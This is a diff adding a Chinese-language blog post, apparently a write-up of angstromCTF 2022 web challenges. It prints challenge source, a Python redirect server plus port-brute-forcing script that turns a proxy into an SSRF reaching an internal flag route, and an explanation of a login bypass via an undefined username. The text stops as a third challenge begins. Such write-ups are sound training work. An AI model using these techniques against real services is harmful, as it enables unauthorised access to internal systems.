@@ -1,0 +1,487 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="paixiaoxing">
+    
+    <title>
+        
+            angstorm比赛复现 |
+        
+        paixiaoxing&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/images/paidaxing.jpg">
+    
+<link rel="stylesheet" href="/css/font-awesome.min.css">
+
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":false,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/images/paidaxing.jpg","favicon":"/images/paidaxing.jpg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"“请用绝对的理智压制不该有的情绪。”"},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":true}}},"local_search":{"enable":false,"preload":false},"code_copy":{"enable":true,"style":"mac"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.4.5"};
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+  </script>
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+                <a class="logo-image" href="/">
+                    <img src="/images/paidaxing.jpg">
+                </a>
+            
+            <a class="logo-title" href="/">
+                paixiaoxing&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                首页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                归档
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                TAGS
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/links"
+                            >
+                                LINKS
+                            </a>
+                        </li>
+                    
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">首页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">TAGS</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/links">LINKS</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">angstorm比赛复现</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/paidaxing.jpg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">paixiaoxing</span>
+                        
+                            <span class="author-label">Lv5</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;
+        <span class="pc">2022-05-08 15:44:12</span>
+        <span class="mobile">2022-05-08 15:44</span>
+    </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/angstorm2022/">angstorm2022</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h1 id="angstorm比赛复现"><a href="#angstorm比赛复现" class="headerlink" title="angstorm比赛复现"></a>angstorm比赛复现</h1><h2 id="School-Unblocker"><a href="#School-Unblocker" class="headerlink" title="School Unblocker"></a>School Unblocker</h2><p>source:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> express <span class="keyword">from</span> <span class="string">&quot;express&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> fetch <span class="keyword">from</span> <span class="string">&quot;node-fetch&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> path <span class="keyword">from</span> <span class="string">&quot;path&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; fileURLToPath, URL &#125; <span class="keyword">from</span> <span class="string">&quot;url&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; resolve4 &#125; <span class="keyword">from</span> <span class="string">&quot;dns/promises&quot;</span>;</span><br><span class="line"></span><br><span class="line">function isIpv4(<span class="built_in">str</span>) &#123;</span><br><span class="line">    const chunks = <span class="built_in">str</span>.split(<span class="string">&quot;.&quot;</span>).<span class="built_in">map</span>(x =&gt; parseInt(x, <span class="number">10</span>));</span><br><span class="line">    <span class="keyword">return</span> chunks.length === <span class="number">4</span> &amp;&amp; chunks.every(x =&gt; !isNaN(x) &amp;&amp; x &gt;= <span class="number">0</span> &amp;&amp; x &lt; <span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function isPublicIp(ip) &#123;</span><br><span class="line">    const chunks = ip.split(<span class="string">&quot;.&quot;</span>).<span class="built_in">map</span>(x =&gt; parseInt(x, <span class="number">10</span>));</span><br><span class="line">    <span class="keyword">if</span> ([<span class="number">127</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">192</span>].includes(chunks[<span class="number">0</span>])) &#123;</span><br><span class="line">        <span class="keyword">return</span> false;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (chunks[<span class="number">0</span>] == <span class="number">172</span> &amp;&amp; chunks[<span class="number">1</span>] &gt;= <span class="number">16</span> &amp;&amp; chunks[<span class="number">1</span>] &lt; <span class="number">32</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> false;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const __dirname = path.dirname(fileURLToPath(<span class="keyword">import</span>.meta.url));</span><br><span class="line"></span><br><span class="line">const app = express();</span><br><span class="line">app.use(express.urlencoded(&#123; extended: false &#125;));</span><br><span class="line"></span><br><span class="line">// environment config</span><br><span class="line">const port = Number(process.env.PORT) || <span class="number">8080</span>;</span><br><span class="line">const flag =</span><br><span class="line">    process.env.FLAG ||</span><br><span class="line">    <span class="string">&quot;actf&#123;someone_is_going_to_submit_this_out_of_desperation&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&quot;/&quot;</span>, (req, res) =&gt; &#123;</span><br><span class="line">    res.sendFile(path.join(__dirname, <span class="string">&quot;index.html&quot;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&quot;/proxy&quot;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        const url = new URL(req.body.url);</span><br><span class="line">        const originalHost = url.host;</span><br><span class="line">        <span class="keyword">if</span> (!isIpv4(url.hostname)) &#123;</span><br><span class="line">            const ips = <span class="keyword">await</span> resolve4(url.hostname);</span><br><span class="line">            // no dns rebinding today &gt;:)</span><br><span class="line">            url.hostname = ips[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!isPublicIp(url.hostname)) &#123;</span><br><span class="line">            res.<span class="built_in">type</span>(<span class="string">&quot;text/html&quot;</span>).send(<span class="string">&quot;&lt;p&gt;private ip contents redacted&lt;/p&gt;&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            const abort = new AbortController();</span><br><span class="line">            setTimeout(() =&gt; abort.abort(), <span class="number">3000</span>);</span><br><span class="line">            const resp = <span class="keyword">await</span> fetch(url.toString(), &#123;</span><br><span class="line">                method: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">                body: <span class="string">&quot;ping=pong&quot;</span>,</span><br><span class="line">                headers: &#123;</span><br><span class="line">                    Host: originalHost,</span><br><span class="line">                    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span></span><br><span class="line">                &#125;,</span><br><span class="line">                signal: abort.signal,</span><br><span class="line">            &#125;);</span><br><span class="line">            res.<span class="built_in">type</span>(<span class="string">&quot;text/html&quot;</span>).send(<span class="keyword">await</span> resp.text());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch (err) &#123;</span><br><span class="line">        res.status(<span class="number">400</span>).<span class="built_in">type</span>(<span class="string">&quot;text/plain&quot;</span>).send(<span class="string">&quot;got error: &quot;</span> + err.message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">// make flag accessible <span class="keyword">for</span> local debugging purposes only</span><br><span class="line">// also the nginx <span class="keyword">is</span> at a private ip that isn<span class="string">&#x27;t 127.0.0.1</span></span><br><span class="line"><span class="string">// it&#x27;</span>s <span class="keyword">not</span> that easy to get the flag :D</span><br><span class="line">app.post(<span class="string">&quot;/flag&quot;</span>, (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (![<span class="string">&quot;127.0.0.1&quot;</span>, <span class="string">&quot;::ffff:127.0.0.1&quot;</span>].includes(req.socket.remoteAddress)) &#123;</span><br><span class="line">        res.status(<span class="number">400</span>).<span class="built_in">type</span>(<span class="string">&quot;text/plain&quot;</span>).send(<span class="string">&quot;You don&#x27;t get the flag!&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="built_in">type</span>(<span class="string">&quot;text/plain&quot;</span>).send(flag);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(port, () =&gt; &#123;</span><br><span class="line">    console.log(`Server listening on port $&#123;port&#125;`);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>看了一下源码发现我们最终需要访问的是flag路由里面的flag</p>
+<p>而flag路由只支持本地访问，而我们是不好通过更改配置来讲ip改成127.0.0.1，这很困难</p>
+<p>所以我们只能通过跳转的方式来让其进行本地的跳转，但是我们不知道本地的端口，需要爆破</p>
+<p>我们可以本地起一个花生壳或者别的在里面设置跳转</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> HTTPServer, BaseHTTPRequestHandler</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">handler</span>(<span class="params">BaseHTTPRequestHandler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">do_POST</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.send_response(<span class="number">308</span>)</span><br><span class="line">        self.send_header(<span class="string">&quot;Location&quot;</span>, <span class="string">f&quot;http://0.0.0.0:<span class="subst">&#123;self.path[<span class="number">1</span>:]&#125;</span>/flag&quot;</span>)</span><br><span class="line">        self.end_headers()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> HTTPServer((<span class="string">&quot;&quot;</span>, <span class="number">4444</span>), handler) <span class="keyword">as</span> server:</span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure>
+
+<p>监听端口4444，然后对访问它的端口进行跳转</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://school-unblocker.web.actf.co/proxy&quot;</span></span><br><span class="line"></span><br><span class="line">port = <span class="number">8085</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = requests.post(url, data=&#123;<span class="string">&quot;url&quot;</span>: <span class="string">f&quot;http://v507330t98.qicp.vip/<span class="subst">&#123;port&#125;</span>&quot;</span>&#125;) <span class="comment"># redirect server        text = res.text</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;log.txt&quot;</span>, <span class="string">&quot;a&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            file.write(<span class="string">f&quot;[<span class="subst">&#123;port&#125;</span>]\n<span class="subst">&#123;text&#125;</span>\n&quot;</span>)</span><br><span class="line">            file.flush()</span><br><span class="line">        <span class="keyword">if</span> port &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> :</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;log.txt&quot;</span>, <span class="string">&quot;a&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            file.write(<span class="string">f&quot;[<span class="subst">&#123;port&#125;</span>]\n-----ERROR-----\n&quot;</span>)</span><br><span class="line">            file.flush()</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        port -= <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>因为proxy可以进行中继跳转里面输入的网址会在本地进行跳转，我们让他跳转到本地的端口就行将它带着端口信息跳转，最后爆破跑就行</p>
+<p>最后在8080端口发现flag</p>
+<h2 id="Secure-Vault"><a href="#Secure-Vault" class="headerlink" title="Secure Vault"></a><strong>Secure Vault</strong></h2><p>打开页面是一个注册登录框</p>
+<p>注册进去一看发现是一段我们可以编写的内容，而且在cookie中含有jwt的信息</p>
+<p>看看源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line">const express = require(&quot;express&quot;);</span><br><span class="line">const path = require(&quot;path&quot;);</span><br><span class="line">const fs = require(&quot;fs&quot;);</span><br><span class="line">const jwt = require(&quot;jsonwebtoken&quot;);</span><br><span class="line">const cookieParser = require(&quot;cookie-parser&quot;);</span><br><span class="line"></span><br><span class="line">const app = express();</span><br><span class="line">app.use(express.urlencoded(&#123; extended: false &#125;));</span><br><span class="line">app.use(cookieParser());</span><br><span class="line"></span><br><span class="line">// environment config</span><br><span class="line">const port = Number(process.env.PORT) || 8080;</span><br><span class="line">const flag =</span><br><span class="line">    process.env.FLAG ||</span><br><span class="line">    &quot;actf&#123;someone_is_going_to_submit_this_out_of_desperation&#125;&quot;;</span><br><span class="line"></span><br><span class="line">const userInfo = &#123;&#125;;</span><br><span class="line">const jwtKey = Math.random().toString();</span><br><span class="line"></span><br><span class="line">class UserStore &#123;</span><br><span class="line">    constructor() &#123;</span><br><span class="line">        this.users = &#123;&#125;;</span><br><span class="line">        this.usernames = &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    insert(username, password) &#123;</span><br><span class="line">        const uid = Math.random().toString();</span><br><span class="line">        this.users[uid] = &#123;</span><br><span class="line">            username,</span><br><span class="line">            uid,</span><br><span class="line">            password,</span><br><span class="line">            vault: &quot;put something here!&quot;,</span><br><span class="line">            restricted: true,</span><br><span class="line">        &#125;;</span><br><span class="line">        this.usernames[username] = uid;</span><br><span class="line">        return uid;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    get(uid) &#123;</span><br><span class="line">        return this.users[uid] ?? &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lookup(username) &#123;</span><br><span class="line">        return this.usernames[username];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    remove(uid) &#123;</span><br><span class="line">        const user = this.get(uid);</span><br><span class="line">        delete this.usernames[user.username];</span><br><span class="line">        delete this.users[uid];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function escape(str) &#123;</span><br><span class="line">    return str</span><br><span class="line">        .replaceAll(&quot;&amp;&quot;, &quot;&amp;amp;&quot;)</span><br><span class="line">        .replaceAll(&#x27;&quot;&#x27;, &quot;&amp;quot;&quot;)</span><br><span class="line">        .replaceAll(&quot;&#x27;&quot;, &quot;&amp;apos;&quot;)</span><br><span class="line">        .replaceAll(&quot;&lt;&quot;, &quot;&amp;lt;&quot;)</span><br><span class="line">        .replaceAll(&quot;&gt;&quot;, &quot;&amp;gt;&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const users = new UserStore();</span><br><span class="line"></span><br><span class="line">app.use((req, res, next) =&gt; &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        res.locals.user = jwt.verify(req.cookies.token, jwtKey, &#123;</span><br><span class="line">            algorithms: [&quot;HS256&quot;],</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; catch (err) &#123;</span><br><span class="line">        if (req.cookies.token) &#123;</span><br><span class="line">            res.clearCookie(&quot;token&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    next();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(&quot;/&quot;, (req, res) =&gt; &#123;</span><br><span class="line">    res.type(&quot;text/html&quot;).send(fs.readFileSync(path.join(__dirname, res.locals.user ? &quot;authed.html&quot; : &quot;index.html&quot;), &quot;utf8&quot;));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(&quot;/register&quot;, (req, res) =&gt; &#123;</span><br><span class="line">    if (</span><br><span class="line">        !req.body.username ||</span><br><span class="line">        !req.body.password ||</span><br><span class="line">        req.body.username.length &gt; 32 ||</span><br><span class="line">        req.body.password.length &gt; 32</span><br><span class="line">    ) &#123;</span><br><span class="line">        res.redirect(</span><br><span class="line">            &quot;/?e=&quot; +</span><br><span class="line">                encodeURIComponent(&quot;Username and password must be 1-32 chars&quot;)</span><br><span class="line">        );</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    if (users.lookup(req.body.username)) &#123;</span><br><span class="line">        res.redirect(</span><br><span class="line">            &quot;/?e=&quot; +</span><br><span class="line">                encodeURIComponent(</span><br><span class="line">                    &quot;Account already exists, please log in instead&quot;</span><br><span class="line">                )</span><br><span class="line">        );</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    const uid = users.insert(req.body.username, req.body.password);</span><br><span class="line">    res.cookie(&quot;token&quot;, jwt.sign(&#123; uid &#125;, jwtKey, &#123; algorithm: &quot;HS256&quot; &#125;));</span><br><span class="line">    res.redirect(&quot;/&quot;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(&quot;/login&quot;, (req, res) =&gt; &#123;</span><br><span class="line">    const user = users.get(users.lookup(req.body.username));</span><br><span class="line">    if (user &amp;&amp; user.password === req.body.password) &#123;</span><br><span class="line">        res.cookie(</span><br><span class="line">            &quot;token&quot;,</span><br><span class="line">            jwt.sign(&#123; uid: user.uid &#125;, jwtKey, &#123; algorithm: &quot;HS256&quot; &#125;)</span><br><span class="line">        );</span><br><span class="line">        res.redirect(&quot;/&quot;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        res.redirect(&quot;/?e=&quot; + encodeURIComponent(&quot;Invalid username/password&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(&quot;/delete&quot;, (req, res) =&gt; &#123;</span><br><span class="line">    if (res.locals.user) &#123;</span><br><span class="line">        users.remove(res.locals.user.uid);</span><br><span class="line">    &#125;</span><br><span class="line">    res.clearCookie(&quot;token&quot;);</span><br><span class="line">    res.redirect(&quot;/&quot;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(&quot;/vault&quot;, (req, res) =&gt; &#123;</span><br><span class="line">    if (!res.locals.user) &#123;</span><br><span class="line">        res.status(401).send(&quot;Log in first&quot;);</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    const user = users.get(res.locals.user.uid);</span><br><span class="line">    res.type(&quot;text/plain&quot;).send(user.restricted ? user.vault : flag);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(&quot;/vault&quot;, (req, res) =&gt; &#123;</span><br><span class="line">    if (!res.locals.user) &#123;</span><br><span class="line">        res.status(401).send(&quot;Log in first&quot;);</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    if (!req.body.vault || req.body.vault.length &gt; 2000) &#123;</span><br><span class="line">        res.redirect(&quot;/?e=&quot; + encodeURIComponent(&quot;Vault must be 1-2000 chars&quot;));</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    users.get(res.locals.user.uid).vault = req.body.vault;</span><br><span class="line">    res.redirect(&quot;/&quot;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(port, () =&gt; &#123;</span><br><span class="line">    console.log(`Server listening on port $&#123;port&#125;`);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>测试发现如果不输入账号密码登录，直接以post什么也不穿，在response页面也会setcookie</p>
+<p>而这个cookie是不附带任何信息的，也就是说我们拿到了一个通用的token</p>
+<p>看看为什么会这样</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">const user = users.get(users.lookup(req.body.username));</span><br><span class="line">get(uid) &#123;</span><br><span class="line">        return this.users[uid] ?? &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lookup(username) &#123;</span><br><span class="line">        return this.usernames[username];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>我们知道js也是一个若语言，所以如果在lookup中传入了一个未定义的值，它将返回<code>undefined</code>。</p>
+<p>至于<code>get(uid)</code>， il 将尝试评估<code>this.users[undefined]</code>，但由于<code>undefined</code>是<a class="link" target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Glossary/Falsy">Falsy<i class="fas fa-external-link-alt"></i></a>，它将返回一个空对象。</p>
+<p>所以，现在我们有了一个空对象user所以在判定的时候user是Truely，密码也一样</p>
+<p>所以我们就可以直接自己设置cookie然后登录拿到flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">actf&#123;is_this_what_uaf_is&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="No-Flags"><a href="#No-Flags" class="headerlink" title="No Flags?"></a>No Flags?</h2><p>给了两个文件，先看看</p>
+<p>Dockerfile：</p>
